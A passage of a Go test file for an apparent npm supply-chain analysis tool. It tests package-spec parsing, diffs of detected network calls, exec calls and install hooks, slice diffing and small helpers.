				t.Errorf("factors count = %d, want >= %d; factors = %v", len(factors), tt.wantCount, factors)
			}
		})
	}
}

// --- parseSpec ---

func TestParseSpec(t *testing.T) {
	tests := []struct {
		spec        string
		wantName    string
		wantVersion string
	}{
		{"express", "express", ""},
		{"express@4.18.0", "express", "4.18.0"},
		{"@scope/pkg", "@scope/pkg", ""},
		{"@scope/pkg@1.2.3", "@scope/pkg", "1.2.3"},
		{"lodash@latest", "lodash", "latest"},
	}

	for _, tt := range tests {
		t.Run(tt.spec, func(t *testing.T) {
			name, version := parseSpec(tt.spec)
			if name != tt.wantName {
				t.Errorf("name = %q, want %q", name, tt.wantName)
			}
			if version != tt.wantVersion {
				t.Errorf("version = %q, want %q", version, tt.wantVersion)
			}
		})
	}
}

// --- computeChanges / diffSlice ---

func TestComputeChanges(t *testing.T) {
	old := &AnalysisResult{
		NetworkCalls:   []string{"fetch()"},
		ExecCalls:      []string{"exec()"},
		Dependencies:   5,
		HasPostInstall: false,
	}
	new := &AnalysisResult{
		NetworkCalls:   []string{"fetch()", "axios"},
		ExecCalls:      nil,
		Dependencies:   8,
		HasPostInstall: true,
	}

	changes := computeChanges(old, new)
	if len(changes) == 0 {
		t.Fatal("expected changes, got none")
	}

	// Check specific changes
	var foundNetworkAdded, foundExecRemoved, foundDepsAdded, foundHookAdded bool
	for _, c := range changes {
		switch {
		case c.Category == "network" && c.Type == "added" && c.Detail == "axios":
			foundNetworkAdded = true
		case c.Category == "exec" && c.Type == "removed" && c.Detail == "exec()":
			foundExecRemoved = true
		case c.Category == "deps" && c.Type == "added":
			foundDepsAdded = true
		case c.Category == "supply_chain" && c.Type == "added" && strings.Contains(c.Detail, "hook"):
			foundHookAdded = true
		}
	}

	if !foundNetworkAdded {
		t.Error("expected 'axios' to be in added network changes")
	}
	if !foundExecRemoved {
		t.Error("expected 'exec()' to be in removed exec changes")
	}
	if !foundDepsAdded {
		t.Error("expected dependency count change")
	}
	if !foundHookAdded {
		t.Error("expected install hook added change")
	}
}

func TestDiffSlice(t *testing.T) {
	tests := []struct {
		name     string
		old, new []string
		added    int
		removed  int
	}{
		{"no changes", []string{"a", "b"}, []string{"a", "b"}, 0, 0},
		{"all new", nil, []string{"a", "b"}, 2, 0},
		{"all removed", []string{"a", "b"}, nil, 0, 2},
		{"mixed", []string{"a", "b"}, []string{"b", "c"}, 1, 1},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			changes := diffSlice("test", tt.old, tt.new)
			var addCount, remCount int
			for _, c := range changes {
				switch c.Type {
				case "added":
					addCount++
				case "removed":
					remCount++
				}
			}
			if addCount != tt.added {
				t.Errorf("added = %d, want %d", addCount, tt.added)
			}
			if remCount != tt.removed {
				t.Errorf("removed = %d, want %d", remCount, tt.removed)
			}
		})
	}
}

// --- setToSlice ---

func TestSetToSlice(t *testing.T) {
	// nil map
	if got := setToSlice(nil); got != nil {
		t.Errorf("setToSlice(nil) = %v, want nil", got)
	}

	// empty map
	if got := setToSlice(map[string]bool{}); got != nil {
		t.Errorf("setToSlice(empty) = %v, want nil", got)
	}

	// non-empty
	m := map[string]bool{"a": true, "b": true}
	got := setToSlice(m)
	if len(got) != 2 {
		t.Errorf("setToSlice count = %d, want 2", len(got))
	}
}

// --- min3 ---

func TestMin3(t *testing.T) {
	tests := []struct {
		a, b, c, want int
	}{
		{1, 2, 3, 1},
		{3, 1, 2, 1},
		{2, 3, 1, 1},
		{5, 5, 5, 5},
		{0, 1, 2, 0},
	}

	for _, tt := range tests {
		got := min3(tt.a, tt.b, tt.c)
		if got != tt.want {
			t.Errorf("min3(%d, %d, %d) = %d, want %d", tt.a, tt.b, tt.c, got, tt.want)
		}
	}
}

// --- diffStringSlices (from maintainer.go) ---

func TestDiffStringSlices(t *testing.T) {
	tests := []struct {
		name    string
		a, b    []string
		wantAdd int
		wantRem int
	}{
		{"identical", []string{"x", "y"}, []string{"x", "y"}, 0, 0},
		{"added", []string{"x"}, []string{"x", "y"}, 1, 0},
		{"removed", []string{"x", "y"}, []string{"x"}, 0, 1},
		{"both empty", nil, nil, 0, 0},
		{"complete swap", []string{"a"}, []string{"b"}, 1, 1},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			added, removed := diffStringSlices(tt.a, tt.b)
			if len(added) != tt.wantAdd {
				t.Errorf("added = %d, want %d", len(added), tt.wantAdd)
			}
			if len(removed) != tt.wantRem {
				t.Errorf("removed = %d, want %d", len(removed), tt.wantRem)
			}
		})
	}
}
